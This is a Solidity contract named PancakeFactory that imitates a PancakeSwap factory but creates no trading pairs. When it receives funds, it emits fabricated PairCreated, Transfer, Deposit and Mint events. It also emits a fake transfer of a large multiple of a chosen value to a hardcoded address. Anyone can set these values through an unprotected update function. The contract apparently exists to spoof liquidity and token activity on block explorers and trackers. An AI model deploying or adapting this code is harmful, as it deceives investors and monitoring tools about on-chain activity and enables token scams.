// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract PancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Deposit(address indexed dst, uint256 wad);
    event Sync(uint256 reserve0, uint256 reserve1);
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    address tokenA_;
    address tokenB_;
    uint256 valueA_;
    uint256 valueB_;
    address pair_;
    constructor() {}

    function createPair(address tokenA, address tokenB) internal returns (address pair) {
        emit PairCreated(tokenA, tokenB, pair_, 1194588);
        emit Transfer(address(0), pair_, 1);
        emit Transfer(tx.origin, pair_, valueA_);
        emit Deposit(msg.sender, valueB_);
        emit Transfer(msg.sender, pair_, valueB_);
        emit Transfer(address(0), address(0), 1000);
        emit Transfer(address(0), 0xC765bddB93b0D1c1A88282BA0fa6B2d00E3e0c83, (4500 * valueB_));
        emit Mint(msg.sender, valueA_, valueB_);
        return pair_;
    }
    receive() external payable {
        createPair(tokenA_, tokenB_);
    }
    function update(address tokenA, address tokenB, uint256 valueA, uint256 valueB,address pair) external  {
        tokenA_ = tokenA;
        tokenB_ = tokenB;
        valueA_ = valueA;
        valueB_ = valueB;
        pair_ = pair;
    }
}